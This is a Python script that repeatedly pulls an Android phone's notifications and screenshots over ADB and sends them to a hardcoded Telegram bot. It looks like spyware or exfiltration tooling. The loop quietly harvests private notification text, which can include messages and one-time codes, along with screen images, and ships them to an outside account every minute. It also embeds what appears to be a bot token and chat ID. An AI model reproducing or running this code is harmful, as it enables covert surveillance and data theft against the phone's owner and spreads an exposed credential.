import subprocess
import requests
import time

# Telegram Bot Configuration
TOKEN = "7762660744:AAHCxlWJvkwnI9ACKDX_zim2G8FEQa1_Drk"
CHAT_ID = "5928551879"

# Send Telegram Message
def send_message(text):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": text}
    response = requests.post(url, data=data)
    return response.json()

# Send Telegram File
def send_file(file_path, caption):
    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
    with open(file_path, "rb") as file:
        response = requests.post(url, data={"chat_id": CHAT_ID, "caption": caption}, files={"document": file})
    return response.json()

# Fetch Notifications using ADB
def fetch_notifications():
    try:
        result = subprocess.check_output(["adb", "shell", "dumpsys", "notification"]).decode("utf-8")
        if result:
            send_message(f"Notifications:\n{result[:4000]}")  # Limit to 4000 chars per message
        else:
            send_message("No notifications found.")
    except Exception as e:
        send_message(f"Error fetching notifications: {e}")

# Capture Screenshot using ADB
def capture_screenshot():
    try:
        file_path = "screenshot.png"
        with open(file_path, "wb") as f:
            subprocess.run(["adb", "exec-out", "screencap", "-p"], stdout=f)
        send_file(file_path, "Screenshot captured")
    except Exception as e:
        send_message(f"Error capturing screenshot: {e}")

# Main Loop
def main():
    while True:
        fetch_notifications()
        capture_screenshot()
        time.sleep(60)  # Run every 60 seconds

if __name__ == "__main__":
    main()
